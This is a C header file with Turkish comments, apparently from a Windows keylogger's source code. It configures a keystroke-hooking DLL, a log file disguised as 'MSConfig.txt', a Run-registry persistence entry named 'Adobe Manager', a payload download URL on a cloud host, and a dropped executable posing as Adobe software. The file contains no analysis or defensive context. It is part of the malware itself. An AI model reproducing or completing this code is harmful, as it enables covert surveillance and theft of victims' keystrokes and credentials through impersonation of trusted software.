#pragma once
#include <windows.h>
#include <tchar.h>
#include <strsafe.h>

// rasgele olacak katarlar 
#define RSCKEY "XOXOXOXOXOXOXOXOXOXO" // dll þifreleme
#define EXENAME "NEWEXE.exe"	// istenen exe ismi
#define HOOK_DLL TEXT("kloc.dll")
#define KEYLOGFILE "MSConfig.txt"
// EXE dosyasýndaki þifreli olacak katalar
#define SUBKEY TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
#define KEYVALUE TEXT("Adobe Manager")
#define ADOBEURL TEXT("http://ec2-52-24-152-136.us-west-2.compute.amazonaws.com/AdobeARM.zip") //
#define ADOBEEXE TEXT("AdobeMng.exe")
#define PATHENVVAR TEXT("ProgramFiles")
#define EXTRAPATH TEXT("Adobe Reader")
// iki dll arasý senkronizasyon
#define EVENTNAME "MyEvent"

#ifndef _DEBUG
#define HATA(A,B)
#define HATAA(A,B)
#else
#define HATA(A,B) ShowHataMsj(A, B)

inline DWORD ShowHataMsj(PTSTR szHata1, PTSTR szHata2) {
	DWORD dwHataKodu = GetLastError();
	TCHAR szHata[100];
	swprintf_s(szHata, 100, L"%s. ErrorCode: %#x\n", szHata2, dwHataKodu);
	MessageBox(
		NULL,
		szHata,
		szHata1,
		MB_ICONINFORMATION | MB_OK
	);
	return dwHataKodu;
}

#define HATAA(A,B) ShowHataMsjA(A, B)

inline DWORD ShowHataMsjA(PSTR szHata1, PSTR szHata2) {
	DWORD dwHataKodu = GetLastError();
	CHAR szHata[100];
	sprintf_s(szHata, 100, "%s. ErrorCode: %#x\n", szHata2, dwHataKodu);
	MessageBoxA(
		NULL,
		szHata,
		szHata1,
		MB_ICONINFORMATION | MB_OK
	);
	return dwHataKodu;
}
#endif
